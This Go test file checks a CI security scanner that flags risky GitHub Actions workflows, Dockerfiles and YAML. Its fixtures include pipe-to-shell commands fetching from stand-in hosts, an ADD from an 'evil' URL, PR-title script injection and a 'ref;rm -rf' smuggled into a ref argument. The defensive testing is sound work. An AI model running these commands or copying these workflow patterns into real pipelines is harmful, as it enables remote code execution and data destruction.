// SPDX-License-Identifier: 0BSD
package cisec

import (
	"context"
	"strings"
	"testing"
)

func rules(fs []Finding) map[string]int {
	m := map[string]int{}
	for _, f := range fs {
		m[f.Rule]++
	}
	return m
}

const badWorkflow = `name: ci
on: pull_request_target
jobs:
  x:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - uses: docker/build-push-action@master
      - run: echo "${{ github.event.pull_request.title }}"
      - run: curl https://x.sh | bash
`

func TestScanWorkflow(t *testing.T) {
	fs := rules(ScanWorkflow(badWorkflow))
	want := []string{"pull_request_target", "prt-checkout-head", "unpinned-action", "script-injection", "pipe-to-shell", "missing-permissions"}
	for _, w := range want {
		if fs[w] == 0 {
			t.Fatalf("missing %s in %v", w, fs)
		}
	}
	if fs["unpinned-action"] != 2 {
		t.Fatalf("want 2 unpinned actions, got %v", fs)
	}
}

const cleanWorkflow = `name: ci
permissions: {}
on: push
jobs:
  x:
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      - run: echo ok
`

func TestScanWorkflowClean(t *testing.T) {
	fs := ScanWorkflow(cleanWorkflow)
	if len(fs) != 0 {
		t.Fatalf("clean workflow flagged: %+v", fs)
	}
}

func TestScanDockerfile(t *testing.T) {
	df := "FROM ubuntu:latest\nRUN curl x.sh | sh\nADD https://evil/x /x\nRUN chmod 777 /app\n"
	fs := rules(ScanDockerfile(df))
	for _, w := range []string{"unpinned-image", "pipe-to-shell", "add-remote", "chmod-777", "no-user"} {
		if fs[w] == 0 {
			t.Fatalf("missing %s in %v", w, fs)
		}
	}
	clean := "FROM ubuntu@sha256:" + strings.Repeat("a", 64) + "\nUSER app\n"
	if fs := ScanDockerfile(clean); len(fs) != 0 {
		t.Fatalf("clean dockerfile flagged: %+v", fs)
	}
}

func TestLintYAML(t *testing.T) {
	bad := "a: 1\n\tb: 2\na: 3\n"
	fs := rules(LintYAML(bad))
	if fs["yaml-tab"] == 0 || fs["yaml-dup-key"] == 0 {
		t.Fatalf("want tab + dup-key: %v", fs)
	}
	if fs := LintYAML("a: 1\nb: 2\n"); len(fs) != 0 {
		t.Fatalf("clean yaml flagged: %+v", fs)
	}
}

func TestRefValidation(t *testing.T) {
	if _, err := ResolveRef(context.Background(), "bad repo", "v1"); err == nil {
		t.Fatal("bad repo accepted")
	}
	if _, err := ResolveRef(context.Background(), "a/b", "ref;rm -rf"); err == nil {
		t.Fatal("bad ref accepted")
	}
}
